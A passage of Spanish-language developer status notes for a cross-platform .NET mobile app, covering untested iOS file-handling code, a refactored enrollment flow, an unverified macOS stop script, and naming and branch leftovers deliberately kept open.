en el `Bridge`, `PickModuleFiles`, `HandleFile`, `LeerDocumento`, `pendingFiles`) y `AppDelegate.OpenUrl`
(`file://` → `HandleFile`), más el observador de `WillEnterForegroundNotification` en `ViewDidLoad` y la llamada a
`shell.ReviewOriginsIfDue()` en `Soltar()` (nota 44, paso 2b: volver a mirar los orígenes al volver al frente, a lo
sumo una vez por hora). Se escribieron en Windows mirando `MainActivity.cs`, que sí está medido, y
los bindings de .NET para iOS. Si algo no compila, va a ser una firma de binding; el comportamiento
esperado está en P6b a P6e.

**El alta ya NO está duplicada, y el merge ya está arreglado.** Las dos cosas que esta sección
decía quedaron hechas: el flujo (`Enroll`, `AcceptEnrollment`, `DiscardEnrollment`,
`PushEnrollment`, `PushProposal`) vive en `Gnothi.MobileShared/Shell.cs`, que ya era dueño del
catálogo, del push y del switch de `Handle`; y `MainActivity.cs` volvió a compilar. Medido:
Android **0 errores**, iOS **0 errores**.

Lo que sí sigue abierto:

**El camino de `--stop` de `scenario-ios.sh` no se probó en una Mac.** Arriba y verificación de
los ocho puertos sí, desde Windows. El stop está escrito contra `lsof`, que macOS trae y Git
Bash no, así que ese ramal corrió sólo por el camino de respaldo. Si no baja algo, `lsof -i
tcp:8095` dice quién lo tiene.

**Nombres en español en las dos cáscaras.** Los tipos ya están en inglés, pero quedan campos y
locales (`anfitrion` en Android, `semilla`, `destino`, `corriendo`, `encuadre`) y comentarios en
`MainActivity.cs` y en la mitad no tocada de `ViewController.cs`. **Se dejó a propósito, no por
olvido:** Jonathan tiene trabajo en vuelo en `MainActivity.cs`, y un barrido de nombres ahí
garantiza otro conflicto como el que hubo que resolver del merge `38dbe22`. Va cuando su rama
aterrice.

**Los mensajes de log siguen en español a propósito.** `alta: bajando el bundle de`, `alta:
'<módulo>' instalado en` y compañía son **contrato observable**: este guion y
`Gnothi.Mobile/PRUEBAS-WEBVIEW.md` les hacen grep exacto. Traducirlos rompe los dos guiones sin
cambiar una línea de comportamiento.

**`f157715` sigue sólo en `spike/ios-app-intents`.** Son las mejoras de Renan a la cáscara
—`Quitar`, `Armar`/`Guardar`, `Iconos`— y no están en esta rama.
